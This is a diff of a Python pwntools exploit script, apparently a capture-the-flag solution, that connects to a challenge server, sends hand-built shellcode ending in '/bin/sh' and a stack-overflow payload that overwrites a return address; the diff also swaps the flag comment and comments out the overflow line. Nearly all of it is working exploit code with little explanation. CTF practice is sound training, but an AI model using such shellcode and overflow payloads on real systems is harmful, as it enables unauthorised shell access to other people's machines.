@@ -1,10 +1,9 @@
 #!/usr/bin/env python
 from pwn import *
 
-# AD{S0meth1ng_usefu1_0n_7he_st4ck!}
+# AD{Beaut1fu1_she11c0d3_~~~~~~~}
 
 host , port = 'ctf.yuawn.idv.tw' , 10110
-#host , port = '192.168.78.135' , 4000
 y = remote( host , port )
 
 '''
@@ -52,14 +51,14 @@ Y   = pop rcx
 
 name = 0x6010c0 # 0x601100 = 0x3b395a3b ^ 0x3b594b3b
 
-sc = 'j;X4;PP^Zh;Z9;XH5;KY;P\\h4>;;XH5;;;;PYYYT_j;X'
+sc = 'j;X4;PP^Zh;Z9;XH5;KY;P\\h4>;;XH5\x00;;;;PYYYT_j;X'
 sc = sc + 'Y' * ( 0x50 - len( sc ) ) + '/bin/sh'
 
 print len( sc )
 
 y.sendafter( ']:' , sc )
 
-y.send( 'D' * 0x10 + p64( 0 ) + p64( name ) )
+#y.send( 'D' * 0x10 + p64( 0 ) + p64( name ) )
 
 sleep(1)
 
